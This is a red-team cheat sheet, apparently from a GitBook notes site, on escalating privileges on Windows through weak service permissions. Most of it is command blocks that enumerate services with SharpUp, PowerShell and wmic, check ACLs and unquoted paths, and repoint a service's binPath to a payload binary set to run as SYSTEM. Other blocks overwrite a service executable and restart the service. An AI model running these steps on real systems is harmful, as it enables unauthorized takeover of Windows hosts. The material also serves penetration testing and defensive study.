# Windows Services Weak Permissions Privilege Escalation

## Windows Services Weak Permissions Privilege Escalation [t-ad-privilege_escalation-windows_services]

### 1.1 Enumerate installed services




**option 1: SharpUp.exe**

{% code overflow="wrap" %}
```bash
SharpUp.exe audit UnquotedServicePath
```
{% endcode %}


**option 2: powershell**

{% code overflow="wrap" %}
```bash
Get-Service | fl
```
{% endcode %}


**option 3: wmic**

{% code overflow="wrap" %}
```bash
run wmic service get name, pathname
```
{% endcode %}

### 1.2 Check for unquoted service paths, related ACLs and modify the executable if possible



{% code overflow="wrap" %}
```bash
Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl

#Create your own service and put it to the path

```
{% endcode %}

{% hint style="info" %}Payloads to abuse services must be specific "service binaries", because they need to interact with the Service Control Manager.

{% endhint %}

### 1.3 Check for weak service config permissions and modify the service if possible




**option 1: SharpUp.exe**

{% code overflow="wrap" %}
```bash
SharpUp.exe audit ModifiableServices
```
{% endcode %}


**option 2: Powershell**

{% code overflow="wrap" %}
```bash
powershell-import C:\Tools\Get-ServiceAcl.ps1
powershell Get-ServiceAcl -Name VulnService2 

sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe

#user also can be changed if necessary
sc config VulnService2 obj="NT AUTHORITY\SYSTEM" password=""

```
{% endcode %}

### 1.4 Check for weak service executable permissions and modify the executable if possible




**option 1: SharpUp.exe**

{% code overflow="wrap" %}
```bash
SharpUp.exe audit ModifiableServices
```
{% endcode %}


**option 2: Powershell**

{% code overflow="wrap" %}
```bash
powershell-import C:\Tools\Get-ServiceAcl.ps1
powershell Get-ServiceAcl -Name VulnService3

run sc stop VulnService3
copy "tcp-local_x64.svc.exe" "Service 3.exe"

```
{% endcode %}

### 1.5 Run the vulnerable service



{% code overflow="wrap" %}
```bash
run sc stop VulnService1
run sc start VulnService1

```
{% endcode %}

